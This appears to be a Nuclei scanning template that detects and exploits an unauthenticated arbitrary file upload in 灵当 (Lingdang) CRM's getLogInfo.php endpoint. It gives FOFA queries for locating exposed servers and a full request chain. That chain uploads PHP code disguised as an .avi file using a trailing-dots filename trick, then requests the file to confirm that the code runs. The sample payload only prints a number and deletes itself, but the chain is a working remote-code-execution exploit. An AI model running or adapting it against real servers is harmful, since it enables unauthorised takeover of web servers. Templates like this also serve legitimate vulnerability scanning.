id: lingdangCRM-getLogInfo-File-upload

info:
  name: 灵当CRM getLogInfo 任意文件上传
  author: Superhero
  severity: high
  description: |-
    fofa: body="crmcommon/js/jquery/jquery-1.10.1.min.js" || body="http://localhost:8088/crm/index.php" && body="ldcrm.base.js" || title="灵当CRM" || body="include/js/ldAjax.js" || title="连接ERP服务管理控制台" && body="登录管理后台"
    灵当CRM getLogInfo 接口存在任意文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
  reference:
    - https://mp.weixin.qq.com/s/tpXcI8y33XIcjJmahDsq3w
  tags: File upload

variables:
  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
  sessionvalue: "uploadfile{{username}}.php......"
  md5_payload: "{{md5(sessionvalue)}}"

http:
  - raw:
      - |
        POST /crm/WeiXinApp/CallRecordLog/getLogInfo.php?userid=&gettype=uploadfile&uploadfilename={{username}}.php......&callednumber=&sessionvalue={{md5_payload}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
        
        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="uploaded_file"; filename="{{username}}.avi"
        Content-Type: image/jpeg

        <?php print(111*222);unlink(__FILE__);?>
        ------WebKitFormBoundary7MA4YWxkTrZu0gW--
    extractors:
       - type: regex 
         part: body
         name: time
         group: 1
         regex:
           - '(storage/mobilecalllog/\b\d{4}/\d{2}/\d{1,2}\b)'
         internal: true
  - raw:
      - |
        GET /crm/{{time}}/{{username}}.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '24642'
      - type: status
        status: 
          - 200